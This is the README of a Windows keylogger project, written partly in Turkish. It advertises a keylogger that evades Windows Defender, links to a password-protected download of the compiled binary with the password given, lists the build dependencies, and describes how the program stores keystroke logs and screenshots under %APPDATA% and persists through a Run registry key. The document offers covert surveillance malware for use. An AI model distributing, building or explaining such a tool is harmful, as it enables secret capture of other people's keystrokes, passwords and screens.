# gngr_local_keylogger_for_windows
(On 06/04/2021) Local Keylogger software has been made for the latest up-to-date "Windows 10" operating system. It managed to circumvent the "Windows Defender" program.


Windows 10 işletim sisteminde çalışan ve Defender gibi güvenlik programlarına yakalanmayan "Local keylogger" programı yazılması hedeflenmiştir. 06/04/2021 tarihi itibarıyla gerçekleştirilmiştir. Zamanla bu durum değişecektir.


Kaynak kodun derlenmiş hali https://drive.google.com/file/d/1tvtZcLb_Sm-gQI8cXSjLKKNoXZlFxd2e/view?usp=sharing adresinde indirilebilir. İndirilen rar dosyasının şifresi "gngr-v1.0"  dir.


Gereksinimler
---------------
PyWin32, pynput, pyautogui, pyinstaller

>> pip install PyWin32

>> pip install pyautogui

>> pip install pyinstaller

"pyinstaller" kodu tek parça çalıştırılabilir dosya haline getirmek için kullanılacak


Kodun Kendisi
-------------
Keylogger kodlanırken "Python 3.8.5" kullanıldı. Program çalışırken; kendisini, log kayıtlarını ve ekran görüntülerini "%APPDATA%\Gngr-keylogger-v1.0\" klasörü altında tutmaktadır. Ayrıca kalıcı olmak için regedit "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" altında "Gngr_keylogger" adı altında "%APPDATA%\Gngr-keylogger-v1.0\keylogger.exe" anahtarı eklemektedir.

